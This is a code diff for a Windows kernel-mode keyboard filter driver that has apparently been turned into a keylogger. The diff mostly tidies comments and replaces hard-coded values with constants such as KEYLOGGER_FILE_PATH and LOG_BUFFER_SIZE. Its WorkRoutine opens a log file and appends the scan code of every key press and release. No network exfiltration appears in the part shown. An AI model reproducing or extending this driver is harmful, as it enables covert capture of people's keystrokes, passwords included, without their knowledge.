@@ -807,13 +807,13 @@ Return Value:
 	devExt = FilterGetData(hDevice);
 
 	//MB 
-
+	//processing input keys
 	PKEYBOARD_INPUT_DATA currentPointer = InputDataStart;
 
 	while (currentPointer < InputDataEnd)
 	{
 
-		/*//processing input and swaping b (0x30) and m (0x32) scan codes
+		/*//swaping b (0x30) and m (0x32) scan codes
 		if (currentPointer->MakeCode == 0x32)
 		{
 			currentPointer->MakeCode = 0x30;
@@ -822,13 +822,15 @@ Return Value:
 		{
 			currentPointer->MakeCode = 0x32;
 		}*/
+
+		//debug print
 		if (currentPointer->Flags == KEY_MAKE)
 		{
-			DebugPrint(("mb sc 1: %d KEY_MAKE\n", currentPointer->MakeCode));
+			DebugPrint(("mb irql: %d sc 1: 0x%0x KEY_MAKE\n",KeGetCurrentIrql(), currentPointer->MakeCode));
 		}
 		else if (currentPointer->Flags == KEY_BREAK)
 		{
-			DebugPrint(("mb sc 1: %d KEY_BREAK\n", currentPointer->MakeCode));
+			DebugPrint(("mb irql: %d sc 1: 0x%0x KEY_BREAK\n",KeGetCurrentIrql(), currentPointer->MakeCode));
 		}
 
 		
@@ -868,7 +870,7 @@ Return Value:
 
 
 	
-	//MB end of added code
+	//MB end
 
 	(*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR)devExt->UpperConnectData.ClassService)(
 		devExt->UpperConnectData.ClassDeviceObject,
@@ -932,37 +934,31 @@ Return Value:
 	return;
 }
 
+
 // MB
-
-
 VOID
 WorkRoutine(PVOID Parameter)
 {
 	POSR_WORK_ITEM OsrWorkItem = (POSR_WORK_ITEM)Parameter;
 
-	
-
-
-	//
-	// Next, we could use the parameters.  He we just display them
-	// to prove we got them
-	//
+	//debug print
 	DebugPrint(("irqlvl: %d params sc = 0x%0x, flags = 0x%0x\n", KeGetCurrentIrql(),
 		OsrWorkItem->MakeCode,
 		OsrWorkItem->Flags));
+
+	//doublechecking if we are on the passive level
 	if (KeGetCurrentIrql() == PASSIVE_LEVEL) {
 
 		//Refer to a file by its object name
-		//file c:\\OS\\test.txt
 		UNICODE_STRING     uniName;
 		OBJECT_ATTRIBUTES  objAttr;
 
-		RtlInitUnicodeString(&uniName, L"\\DosDevices\\C:\\OS\\test.txt");  // or L"\\SystemRoot\\example.txt"
+		RtlInitUnicodeString(&uniName,KEYLOGGER_FILE_PATH);
 		InitializeObjectAttributes(&objAttr, &uniName,
 			OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
 			NULL, NULL);
 
-		//obtain a file handle
+		//obtaining a file handle
 
 		HANDLE   handle;
 		NTSTATUS ntstatus;
@@ -979,7 +975,7 @@ WorkRoutine(PVOID Parameter)
 			NULL, 0);
 
 		//opening and writing to file
-		CHAR     buffer[30]; //30 should be replaced with buffer size
+		CHAR     buffer[LOG_BUFFER_SIZE]; 
 		size_t  cb;
 
 		//Set the byte offset to the end of file
@@ -989,6 +985,7 @@ WorkRoutine(PVOID Parameter)
 		ByteOffset.LowPart = FILE_WRITE_TO_END_OF_FILE;
 
 		if (NT_SUCCESS(ntstatus)) {
+			//wiriting logs to file
 			if (OsrWorkItem->Flags == KEY_MAKE) {
 				ntstatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "scan code: 0x%0x KEY_MAKE\r\n", OsrWorkItem->MakeCode);
 			}
